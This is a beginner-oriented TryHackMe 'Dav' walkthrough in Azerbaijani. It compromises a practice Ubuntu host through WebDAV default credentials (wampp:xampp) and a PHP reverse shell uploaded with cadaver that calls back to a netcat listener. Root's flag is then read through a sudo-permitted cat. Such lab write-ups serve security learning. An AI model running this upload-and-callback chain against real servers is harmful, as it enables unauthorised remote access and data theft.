# 🟢 TryHackMe — Dav Writeup (Tam İzahlı)

> **Çətinlik:** Asan  
> **OS:** Linux (Ubuntu)  
> **Məqsəd 1:** `user.txt` faylını tap  
> **Məqsəd 2:** `root.txt` faylını tap

---

## 📖 Bu Lab Haqqında

Dav — Linux Ubuntu serverindəki **WebDAV** servisinin yanlış konfiqurasiyasından istifadə edərək sisteme daxil olmaq üzərindədir.

**Hücumun xülasəsi:**
```
1. Nmap → yalnız 80 portu açıqdır
2. Gobuster → /webdav qovluğu tapılır
3. Default credentials → wampp:xampp
4. cadaver → PHP reverse shell yüklənir
5. netcat → shell əldə edilir
6. sudo -l → cat-i root kimi işlədə bilirik
7. root.txt oxunur
```

---

## 🧠 Yeni Başlayanlar Üçün Əsas Anlayışlar

### WebDAV nədir?

**WebDAV** (Web Distributed Authoring and Versioning) — HTTP protokolunun genişləndirilməsidir.  
Normal HTTP-də sən yalnız faylları **oxuya** bilərsən (GET).  
WebDAV-da isə faylları **yükləyə, silə, dəyişdirə** bilərsən (PUT, DELETE, MOVE).

Düşün ki FTP kimidir — amma veb üzərindən işləyir.

**Problem nədir?**  
Əgər WebDAV server default (standart) şifrə ilə qurulubsa və şifrə dəyişdirilməyibsə — istənilən şəxs daxil ola bilər.  
Üstəlik, PHP faylı yükləyib serverdə icra etmək mümkündürsə — bu **RCE** deməkdir.

### Reverse Shell nədir?

Normal bağlantı: biz → hədəf  
Reverse shell: hədəf → biz

Hədəf maşına PHP faylı yükləyirik.  
PHP faylı işləyəndə hədəf bizim maşınımıza bağlanır.  
Nəticədə biz hədəfin terminalını idarə edirik.

---

## 📁 Addım 0: İş Qovluğu Yarat

```bash
mkdir ~/Desktop/dav && cd ~/Desktop/dav
```

**Niyə?** — Hər lab üçün ayrı qovluq açmaq yaxşı vərdişdir. Bütün fayllar bir yerdə qalsın.

---

## 🔍 Addım 1: Nmap ilə Skan

```bash
nmap -sV -sC 10.10.X.X
```

**Hər flag nə deməkdir?**

| Flag | Mənası |
|------|--------|
| `-sV` | Service Version — hansı proqramın hansı versiyası işləyir |
| `-sC` | Default Scripts — əlavə məlumat toplamaq üçün scriptlər işlət |

### Nəticə:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Yalnız 1 port açıqdır — 80 (HTTP).**

Bu o deməkdir ki:
- Yalnız veb server var
- SMB, SSH, FTP yoxdur
- Hər şey veb üzərindən olacaq

Brauzerdə `http://10.10.X.X` açsaq — standart Apache səhifəsi görünür. Maraqlı bir şey yoxdur.

---

## 🔎 Addım 2: Gobuster ilə Gizli Qovluqlar Tap

### Gobuster nədir?

**Gobuster** — veb saytda gizli qovluq və faylları tapmaq üçün istifadə edilən alətdir.  
Wordlist (söz siyahısı) götürür, hər sözü URL-ə əlavə edir, server cavab verir ya yox yoxlayır.

Məsələn:
```
http://10.10.X.X/admin    → 404 (yoxdur)
http://10.10.X.X/login    → 404 (yoxdur)
http://10.10.X.X/webdav   → 401 (var, amma şifrə lazımdır!)
```

### Əmr:

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
```

**Hər flag nə deməkdir?**

| Flag | Mənası |
|------|--------|
| `dir` | Directory/fayl axtarış modu |
| `-u` | URL — hədəf ünvan |
| `-w` | Wordlist — söz siyahısının yolu |

**`/usr/share/wordlists/dirb/common.txt` nədir?**  
Kali Linux-da hazır gələn wordlist. Ən çox istifadə edilən qovluq adlarını ehtiva edir (~4600 söz).

### Nəticə:

```
/webdav    (Status: 401)
```

**401** = Unauthorized = Bu qovluq var, amma daxil olmaq üçün şifrə lazımdır.

Brauzerdə `http://10.10.X.X/webdav` açsaq — login pop-up çıxır.

---

## 🔑 Addım 3: Default Credentials ilə Daxil Ol

### Default credentials nədir?

Çox proqram qurularkən standart (default) istifadəçi adı və şifrə ilə gəlir.  
Sistem administratoru bu şifrəni **dəyişdirməlidirsə** — amma çox vaxt dəyişdirmir.

**WebDAV-ın məşhur default credentials-ı:**
```
Username: wampp
Password: xampp
```

Bu credentials XAMPP (Windows-da Apache qurmaq üçün paket) ilə birlikdə gələn WebDAV üçün standartdır.  
Google-da "webdav default credentials" axtaranda dərhal tapılır.

Brauzerdə `http://10.10.X.X/webdav` açıb bu credentials-ı daxil et.

Daxil olduqda — `passwd.dav` adlı fayl görünür. İçindəki hash-ı crack etmək olmur, amma bizə lazım da deyil.

---

## 🛠️ Addım 4: davtest ilə Nə Yükləyə Biləcəyimizi Yoxla

### davtest nədir?

**davtest** — WebDAV serverinə hansı tip faylları yükləyib icra edə biləcəyini yoxlayan alətdir.  
Avtomatik müxtəlif tipli test faylları (PHP, ASP, HTML, txt...) yükləyir, hansının icra olunduğunu göstərir.

```bash
davtest -url http://10.10.X.X/webdav -auth wampp:xampp
```

**`-auth`** = authentication = giriş məlumatları

### Nəticə (vacib hissə):

```
DAVTEST Summary:
Sending test files
PUT     php     SUCCEED
EXEC    php     SUCCEED
```

**`SUCCEED`** — PHP faylı həm yükləmək, həm də icra etmək mümkündür!

Bu o deməkdir ki: PHP reverse shell yükləyib işlədə bilərik.

---

## 🐚 Addım 5: PHP Reverse Shell Hazırla

### Reverse shell faylı tap:

Kali Linux-da hazır PHP reverse shell var:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/dav/shell.php
```

**`cp`** = copy — faylı kopyala.  
`/usr/share/webshells/php/` — Kali-nin hazır shell kolleksiyası.

### IP və portu dəyiş:

```bash
nano ~/Desktop/dav/shell.php
```

Faylın içində bu hissəni tap və dəyiş:

```php
$ip = '127.0.0.1';   // BUNU DƏYİŞ — Kali-nin IP-si
$port = 1234;         // BUNU DƏYİŞ — istədiyin port
```

Belə olmalıdır:
```php
$ip = '10.10.X.X';   // Sənin Kali/TryHackMe VPN IP-n
$port = 4444;         // İstədiyin port (4444 standartdır)
```

**Kali IP-ni tapmaq üçün:**
```bash
ip addr show tun0
```
`tun0` = TryHackMe VPN interfeysi. Oradakı IP-ni kopyala.

**Nano-dan çıxmaq üçün:** `Ctrl+X` → `Y` → `Enter`

---

## 📤 Addım 6: cadaver ilə Shell Yüklə

### cadaver nədir?

**cadaver** — WebDAV serverləri ilə işləmək üçün komanda xətti alətidir.  
FTP client kimi düşün — amma HTTP/WebDAV üçün.  
Fayl yükləmək, silmək, siyahıya almaq mümkündür.

### cadaver qurulmayıbsa:

```bash
apt install cadaver -y
```

### cadaver ilə WebDAV-a qoşul:

```bash
cadaver http://10.10.X.X/webdav
```

Login soruşacaq:
```
Authentication required for webdav on server `10.10.X.X':
Username: wampp
Password: xampp
```

Daxil olduqdan sonra `dav:/webdav/>` prompt görünür.

### Shell faylını yüklə:

```
dav:/webdav/> put /root/Desktop/dav/shell.php
```

**`put`** = faylı serverə yüklə.  
Tam yolu yazmalısan — `/root/Desktop/dav/shell.php`.

Nəticə:
```
Uploading /root/Desktop/dav/shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5491 bytes succeeded.
```

Yükləmə uğurlu oldu! cadaver-dən çıx:
```
dav:/webdav/> exit
```

---

## 👂 Addım 7: Netcat Listener Aç

### Netcat nədir?

**Netcat (nc)** — şəbəkə bağlantıları üçün universal alətdir.  
Biz onu "qulaq asmaq" üçün istifadə edirik — hədəf maşın bizə qoşulduqda bağlantını qəbul edirik.

**Yeni terminal aç** (cadaver terminalını bağlama):

```bash
nc -lvnp 4444
```

**Hər flag nə deməkdir?**

| Flag | Mənası |
|------|--------|
| `-l` | Listen mode — gələn bağlantıları gözlə |
| `-v` | Verbose — ətraflı məlumat göstər |
| `-n` | DNS-i yoxlama, yalnız IP istifadə et |
| `-p 4444` | Port 4444-də gözlə |

İndi terminal belə görünür — gözləyir:
```
Listening on 0.0.0.0 4444
```

---

## 🔥 Addım 8: Shell-i Aktivləşdir

Brauzerdə shell faylını aç:

```
http://10.10.X.X/webdav/shell.php
```

Brauzer "yüklənir" vəziyyətinə keçəcək — bu normaldır.  
Bu o deməkdir ki PHP faylı icra olunur və hədəf maşın bizə qoşulmağa çalışır.

**Netcat terminalına bax:**

```
Connection received on 10.10.X.X 54321
Linux ubuntu 4.4.0-159-generic #187-Ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

**Shell açıldı! ✅**

`www-data` — Apache veb serverinin default istifadəçisidir. Hələ root deyilik, amma sistemdəyik.

### Shell-i daha rahat et:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Nə edir?** — Sadə shell-i tam interaktiv bash shell-ə çevirir. Tab completion, düzgün prompt işləyir.

---

## 🚩 Addım 9: user.txt Flag-ı Tap

```bash
find / -name "user.txt" 2>/dev/null
```

**Bu əmri parçalayaq:**

| Hissə | Mənası |
|-------|--------|
| `find /` | Root-dan başlayaraq bütün sistemi axtar |
| `-name "user.txt"` | Bu adda fayl axtar |
| `2>/dev/null` | Xəta mesajlarını göstərmə (icazəsiz qovluqlar üçün) |

Nəticə:
```
/home/merlin/user.txt
```

Oxu:
```bash
cat /home/merlin/user.txt
```

**user.txt tapıldı! ✅**

---

## ⬆️ Addım 10: Privilege Escalation — root.txt

### Privilege Escalation nədir?

Hazırda `www-data` istifadəçisiyik — az səlahiyyət var.  
`root` olmaq lazımdır — tam səlahiyyət.  
**Privilege Escalation** = aşağı səlahiyyətdən yüksəyə qalxmaq.

### sudo -l yoxla:

```bash
sudo -l
```

**`sudo -l` nə edir?**  
Hazırkı istifadəçinin şifrəsiz `sudo` ilə hansı əmrləri işlədə biləcəyini göstərir.

Nəticə:
```
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

**Bu nə deməkdir?**

`www-data` istifadəçisi **şifrəsiz** `sudo` ilə `/bin/cat` əmrini işlədə bilər.  
`(ALL)` = istənilən istifadəçi adından (o cümlədən root-dan)  
`NOPASSWD` = şifrə lazım deyil  
`/bin/cat` = yalnız `cat` əmri

Yəni: biz `sudo cat` ilə **istənilən faylı** oxuya bilərik — o cümlədən root-a məxsus faylları!

### root.txt oxu:

```bash
sudo cat /root/root.txt
```

**`sudo cat` niyə işləyir?**  
Normalde `www-data` `/root/` qovluğuna daxil ola bilməz.  
Amma `sudo cat` ilə root-un səlahiyyətlərindən istifadə edirik — fayl açılır.

**root.txt tapıldı! ✅**

---

## 📋 Nəticə

| Tapılan | Yol |
|---------|-----|
| WebDAV qovluğu | Gobuster ilə tapıldı |
| Credentials | Default `wampp:xampp` |
| Shell | cadaver + PHP reverse shell |
| user.txt | `/home/merlin/user.txt` |
| root.txt | `sudo cat /root/root.txt` |

---

## 📚 Öyrəndiklərimizi Ümumiləşdirək

| Addım | Nə etdik | Niyə etdik |
|-------|----------|------------|
| Nmap | Port 80 açıq — Apache tapıldı | Hədəfi tanımaq |
| Gobuster | `/webdav` qovluğu tapıldı | Gizli səhifələri tapmaq |
| Default creds | `wampp:xampp` ilə daxil oldq | Default şifrələr çox vaxt dəyişdirilmir |
| davtest | PHP yükləmək və icra etmək mümkün | Hansı hücum vektorunun işlədiyini bilmək |
| PHP shell hazırladıq | IP və portu dəyişdirdik | Hədəf bizə qoşulsun deyə |
| cadaver `put` | Shell faylını yüklədik | WebDAV fayl yükləməyə icazə verir |
| netcat listener | Gələn bağlantını gözlədik | Reverse shell üçün qulaq asmaq |
| Shell aktivləşdi | Brauzderdə PHP faylı açıldı | Server PHP-ni icra etdi |
| sudo -l | cat-i root kimi işlədə bilərik | Privilege escalation vektoru |
| sudo cat | root.txt oxudq | www-data cat-i şifrəsiz sudo ilə işlədə bilir |

---

## 🛠️ İstifadə Edilən Alətlər

| Alət | Nə üçün | Qeyd |
|------|---------|------|
| `nmap` | Port skanı | Kali-də hazır |
| `gobuster` | Gizli qovluq tapmaq | Kali-də hazır |
| `davtest` | WebDAV imkanlarını yoxlamaq | `apt install davtest` |
| `cadaver` | WebDAV-a fayl yükləmək | `apt install cadaver` |
| `php-reverse-shell.php` | Reverse shell payloadu | `/usr/share/webshells/php/` |
| `netcat (nc)` | Gələn shell bağlantısını qəbul etmək | Kali-də hazır |

---

## 💡 Bu Labdan Öyrənilən Dərslər

1. **Default credentials həmişə yoxla** — `wampp:xampp`, `admin:admin`, `root:root`
2. **WebDAV təhlükəlidir** — fayl yükləməyə icazə verirsə və PHP icra olunursa = RCE
3. **sudo -l həmişə yoxla** — privilege escalation üçün ilk addım
4. **`cat` sudo-da görünsə** — istənilən faylı oxumaq mümkündür
5. **Gobuster** — gizli qovluqlar üçün standart alət

---

*Writeup — sıfırdan öyrənən üçün yazıldı 🎯*
